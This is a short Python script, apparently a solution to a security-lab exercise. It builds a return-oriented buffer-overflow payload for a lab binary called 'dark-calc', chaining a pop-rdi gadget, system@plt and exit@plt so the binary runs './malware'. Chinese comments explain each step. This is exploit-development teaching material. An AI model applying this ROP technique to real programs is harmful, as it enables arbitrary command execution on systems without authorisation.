#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys
import struct

def p64(x):
    return struct.pack('<Q', x)

pop_rdi_ret = 0x401c93     # pop rdi; ret
system_addr = 0x4017e0     # system@plt
strcpy_dest = 0x6030d0     # strcpy 目的地
exit_addr   = 0x401880     # exit@plt (加上这个，让程序打完字安全退出)

cmd = b'./malware\x00'
padding = b'A' * (24 - len(cmd))

payload = cmd + padding
payload += p64(pop_rdi_ret)    # pop rdi
payload += p64(strcpy_dest)    # 将字符串地址放入 rdi
payload += p64(system_addr)    # 调用 system
payload += p64(exit_addr)      # system 执行完后，调用 exit(0) 完美退出，防止段错误吞掉输出

sys.stdout.buffer.write(payload)